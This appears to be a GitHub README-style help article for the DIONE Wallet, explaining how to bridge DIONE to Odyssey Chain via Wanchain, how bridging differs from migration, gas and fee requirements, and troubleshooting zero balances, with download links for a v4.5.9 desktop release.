![DIONE Wallet](assets/banner-article.png)

# Bridge DIONE to Odyssey Chain With Wanchain

<p align="center">Locked on one side, issued on the other</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

The bridge moves DIONE between Odyssey Chain and other networks, and Wanchain is the route the project names for it. A bridge is not a migration: it locks an asset on one side and issues a representation on the other, and it needs gas on both. Send a small amount first, every time.

## Bridge versus migration, again

These two get conflated and the confusion is expensive.

The **migration** was a one-time 1:1 conversion of ERC-20 DIONE into the native asset at launch. It does not repeat, and native DIONE does not need it.

A **bridge** is a tool you can use whenever you want, in either direction, and it produces a wrapped asset on the destination chain rather than converting anything. Bridge wrapped DIONE back and you get DIONE; keep it bridged and you hold a representation.

[Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md) covers the one-time event; this article is about the repeatable one.

## What bridging requires

Three things, and the third is the one people forget:

- **The asset on the source chain**, in an address you control.
- **Gas on the source chain** to pay for the lock transaction.
- **Gas on the destination chain** to do anything with what arrives. An arrival you cannot move is not an arrival.

That third requirement is the reason a bridge transaction can look like a loss: the tokens arrived, and the destination wallet had no native balance to pay for the next step. If Odyssey Chain is the destination, the arriving asset needs DIONE for fees.

## The route, step by step

1. Confirm what you are bridging: native DIONE, ERC-20 DIONE, or a wrapped form. These are different assets and the bridge treats them differently.
2. Note the destination address and confirm it is on the chain you intend.
3. Fund both sides with gas before starting - the source chain first, then the destination.
4. Bridge a small test amount.
5. Confirm arrival on the destination explorer before bridging the balance.
6. Keep the source and destination transaction hashes.

Step five is not paranoia. Bridges fail in the gap between "the source transaction succeeded" and "the destination transaction exists", and that gap is where support requests live.

## Does the bridge show zero?

A zero balance after bridging usually means one of four things:

- **The transaction is still in flight.** Bridges are not instant, and the destination leg can lag the source leg.
- **The wrong network is selected** in the wallet, so the arrival is not being displayed.
- **The asset arrived in wrapped form** and the wallet is showing the native balance.
- **The destination address was different** from the one being checked.

How long a bridge takes depends on the route and on the destination chain's confirmation times: the source leg confirms first and the destination leg follows, sometimes within minutes, sometimes longer when the destination chain is congested.

In every case the resolution is the same: find the destination transaction on the destination explorer. If it exists, the asset is there and the wallet display is the problem.

## Sending DIONE to a wallet it never reached

The classic failure is a transfer to an address on the wrong network, or to a contract address, or to an exchange deposit address for a different asset. Any of these looks like a disappearance and none of them is a bridge issue.

Before blaming the bridge, check what was actually sent: the asset, the chain, and the recipient.

The classic case is DIONE sent to MetaMask on Odyssey that never arrived: MetaMask shows nothing until the Odyssey network is added with chain ID 153153, at which point the balance appears. Nothing left the chain; the wallet simply was not looking at it. A transaction that succeeded on the source chain did exactly what it was told. [DIONE Wallet Transaction Failed: Read the Error, Then Act](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-transaction-failed.md) is the diagnostic order when the history is unclear.

## What the bridge fee costs

Bridges charge a fee on top of gas, and the fee is quoted before you confirm. On small amounts the fee can be a large share of the transfer, which is a reason to bridge once rather than repeatedly in small pieces.

Moving USDC held on Odyssey back to Ethereum follows the same route in reverse: the asset is bridged rather than swapped, and the destination leg needs Ethereum gas before the balance can move again.

Check the quoted fee against the amount. A bridge that quotes more than a few percent on a modest transfer is not a good deal, whatever the destination.

## When the bridge is the right tool

Use it when the asset needs to be somewhere else: DIONE moving to another chain for a venue that only exists there, or value coming back to Odyssey Chain to stake or hold natively.

Do not use it as a substitute for the migration, and do not use it to "fix" a balance the verifier did not recognise - that is a record question, not a routing one. [DIONE Migration Verifier Shows No Balance](https://github.com/dione-protocol/keys-and-transfers/blob/main/dione-migration-verifier-shows-no-balance.md) covers that case.

## Security around bridges

Bridges are the highest-value target in most ecosystems because they hold locked assets on one side. Three rules follow:

- **Use the route the project publishes**, not a link from a message or a search result.
- **Verify the destination address on your own screen**, not from a chat.
- **Never approve a token allowance to a contract you do not recognise.** [Spot a Fake DIONE Site or Support Scam](https://github.com/dione-protocol/keys-and-transfers/blob/main/spot-a-fake-dione-site.md) covers the patterns, and bridging is where they are most often deployed.

## After the bridge

Two things to do: confirm the balance in the destination wallet, and confirm it can move - a test transaction of a trivial amount proves the gas situation before you depend on the funds.

Then decide what the asset is for. Bridged DIONE that is going to be held should probably come home; bridged DIONE that is going to be used on the destination chain should stay there.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

The wallet is where the bridged balance appears and where the destination network is configured, so a build that is behind can leave a successful bridge looking empty. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before diagnosing a display problem as a transfer problem.

## FAQ

### How do I bridge DIONE to Odyssey Chain?

Use the bridge route the project publishes, Wanchain among them: fund gas on both chains, bridge a small test amount, confirm arrival on the destination explorer, then bridge the rest.

### Is bridging the same as the DIONE migration?

No. The migration was a one-time 1:1 conversion at launch; a bridge is a repeatable transfer that produces a wrapped representation.

### Why does the bridge show zero after I bridged?

Usually the destination leg has not completed, the wallet is on the wrong network, the asset arrived in wrapped form, or the destination address differs from the one being checked.

### How much DIONE do I need for the bridge fee?

Enough for the quoted bridge fee plus gas on the source chain, and enough on the destination chain to move what arrives.

### Can I bridge back to Ethereum?

Yes, the bridge runs in both directions. The same rules apply: gas on both sides, a small test first, and the destination explorer to confirm.

A bridge moves a representation while the migration changed the asset itself; keeping the two apart prevents most of the losses around either. The migration is in [Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md), network setup in [Add Another Network to DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/add-another-network-to-dione-wallet.md), and the safety patterns in [Spot a Fake DIONE Site or Support Scam](https://github.com/dione-protocol/keys-and-transfers/blob/main/spot-a-fake-dione-site.md).
